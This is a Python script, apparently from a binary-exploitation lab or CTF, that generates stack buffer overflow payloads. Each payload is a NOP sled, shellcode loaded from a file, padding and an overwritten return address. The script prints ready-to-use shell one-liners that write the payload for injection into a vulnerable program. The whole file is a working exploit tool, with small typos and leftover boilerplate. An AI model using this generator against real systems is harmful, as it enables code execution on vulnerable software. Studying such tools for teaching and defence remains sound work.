import os
import sys
import ast

# -   Buffer size = 263 bytes
#     -   b'\x90'\*???
#     -   shellcode = sonstant bytes
#     -   b'\x90'\*22            <Some pading as msvenomunpacks there is >
# -   RBP = 8 bytes
# -   return addres = `b'0xbeadbeef'`

def toHexString(bytestring):
    """
    Converts a byte string to a hex string.

    :param bytestring: a bytes object to be converted.
    :return: a string that represents the hex values of the bytes object.
    """
    hex_string = "b'"
    for byte in bytestring:
        hex_string += f"\\x{byte:02x}"
    hex_string += "'"
    return hex_string

def int_to_bytes(value, byteorder):
    """
    Converts an integer to bytes.

    :param value: an integer to be converted.
    :param byteorder: a string that represents the byte order.
    :return: a bytes object that represents the converted integer.
    """
    return value.to_bytes((value.bit_length() + 7) // 8, byteorder)

def create_payload(buffer_address, shellcode, target_size, little_endian=True):
    """
    Generates a payload for a buffer overflow attack.

    :param buffer_address: an integer that represents the address of the buffer.
    :param shellcode: a bytes object that represents the shellcode.
    :param target_size: an integer that represents the target size of the payload.
    :param little_endian: a boolean that represents the byte order. Default is True.
    """

    if not isinstance(buffer_address, int):
        raise ValueError("Buffer address should be an integer")

    buffer_address_bytes = int_to_bytes(buffer_address, 'little' if little_endian else 'big')

    nop_sled_size = 60
    padding_size = target_size - len(shellcode) - nop_sled_size

    if padding_size < 22:
        nop_sled_size -= (22 - padding_size)
        padding_size = 22

    if nop_sled_size < 0:
        raise ValueError("Target size should be greater than the shellcode size plus minimum padding sizes")

    nop_sled = b'\x90' * nop_sled_size
    padding = b'\x90' * padding_size
    payload = nop_sled + shellcode + padding + buffer_address_bytes

    print("------------------")
    print(f"Nop sled size: {nop_sled_size}")
    print(f"Shellcode size: {len(shellcode)}")
    print(f"Padding: {padding_size}")
    print("------------------")
    print("")
    print("Short:")
    print(f"$(python3 -c \"import sys; sys.stdout.buffer.write(b\'\\x90\'*{nop_sled_size} + {toHexString(shellcode)} + b\'\\x90\'*{padding_size} + {toHexString(buffer_address_bytes)})\")")
    print("")
    print("Long:")
    print(f"$(python3 -c \"import sys; sys.stdout.buffer.write({toHexString(payload)})\")")


if __name__ == "__main__":
    import argparse

    # custom type for shellcode file argument
    def shellcode_file(path):
        """
        Reads the content of a file containing a hex-encoded byte string and converts it to a bytes object.

        :param path: a string that represents the path to the file.
        :return: a bytes object that represents the content of the file.
        """

        # open file containing hex-encoded byte string
        with open(path, 'rb') as f:
            # read content of file as string
            content = f.read()

        # parse hex-encoded byte string using ast.literal_eval()
        return content

    # create ArgumentParser object
    parser = argparse.ArgumentParser(description='Process some integers.')

    # add argument for return_address
    parser.add_argument('--buffer_addres', help='an hex address', required=True)

    # add argument for buffer_size
    parser.add_argument('--buffer_size', type=int, help='an integer representing the buffer size', required=True)

    # add argument for buffer_size
    parser.add_argument('--shellcode', type=shellcode_file,
                        help='a file containing the shellcode bytes')
    
    # parse command-line arguments
    args = parser.parse_args()

    if not args.shellcode:
        args.shellcode = shellcode_file("./shell")

    create_payload(int(args.buffer_addres, 16), args.shellcode ,int(args.buffer_size))
